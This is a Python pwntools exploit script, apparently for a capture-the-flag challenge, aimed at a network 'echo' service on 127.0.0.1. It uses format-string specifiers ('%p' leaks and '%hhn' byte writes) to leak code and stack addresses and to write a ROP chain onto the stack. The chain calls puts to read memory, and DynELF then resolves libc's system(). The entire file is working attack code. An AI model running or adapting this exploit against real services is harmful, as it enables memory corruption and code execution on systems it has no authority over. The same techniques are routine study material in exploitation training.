from pwn import *
from binascii import *

f = open('input', 'w')

#p = process('./echo')
p = remote('127.0.0.1', 6666)
#p = remote('192.168.56.102', 6666)


def write(addr, cont):
	if u8(cont)<= 0xa:
		print 'small'
		print u8(cont)
		payload  = ''
		payload += 'a'*u8(cont)
		payload += '%13$hhn'
		payload  = payload.ljust(2+0x16, 'a')
		payload += p32(addr)
#		print payload.encode('hex')
#		print payload
		p.recvuntil('age: ')
		p.sendline(payload)
		f.write(payload + '\n')
	else:	
		payload  = ''
		payload += '%'+'0'*(0xe - len(str(u8(cont)))) + str(u8(cont))+'d'
		#payload += '%13$paaa'
		payload += '%13$hhna'
		payload  = payload.ljust(16, 'b')
		payload += p32(addr)
		p.recvuntil('age: ')
		p.sendline(payload)
		f.write(payload + '\n')

def write4(addr, cont):
	write(addr, cont[0:1])
	write(addr+1, cont[1:2])
	write(addr+2, cont[2:3])
	write(addr+3, cont[3:4])


def leak_addr(n):
	payload  = ''
	payload += '%'+str(n)+'$p'
#	print b2a_hex(payload)
#	print (payload)
	print p.recvuntil('age: ')
	p.sendline(payload)
	f.write(payload + '\n')
	data = p.recv(10)
	return int(data, 16)

a = leak_addr(15)
base = a - 0x38c 
log.info('base:' + hex(base))
puts_plt = base + 0x600
main = base + 0x79b
popebp_ret = base + 0x000006a9
a = leak_addr(17)
stack_main = 0x40803698 - 0x408036d4 + a
log.info('stack_main:' + hex(stack_main))

def leak(address):
	payload  = ''
	payload += p32(stack_main)		#ebp
	payload += p32(puts_plt)
	payload += p32(main)
	payload += p32(address)
	print 'puts_plt',hex(puts_plt)
	print 'main',hex(main)
	print 'address',hex(address)
	print 'payload',b2a_hex(payload)
	write4(stack_main, payload[0:4])
	write4(stack_main+4, payload[4:8])
	write4(stack_main+8, payload[8:12])
	write4(stack_main+12, payload[12:16])
	data = p.recvuntil('\nY')
	print '---------------------'
	print data
	print b2a_hex(data)
	print '---------------------'
	data = (data[-6:-2])
	print hex(address),'=>',hex(u32(data))
	return data
raw_input()
leak(base+0x930)
p.sendline('exit')
data = p.recvuntil('age:')
data = p.recvuntil('Wel')
print '---------------------'
print data
print b2a_hex(data)
print '---------------------'

p.interactive()

leak(base)
p.sendline('exit')
data = p.recvuntil('age:')
data = p.recvuntil('Wel')
print '---------------------'
print data
print b2a_hex(data)
print '---------------------'

d = DynELF(leak, elf=ELF("echo"))
system_addr = d.lookup('system', base, 'libc')
print "system_addr=" + hex(system_addr)


f.close()

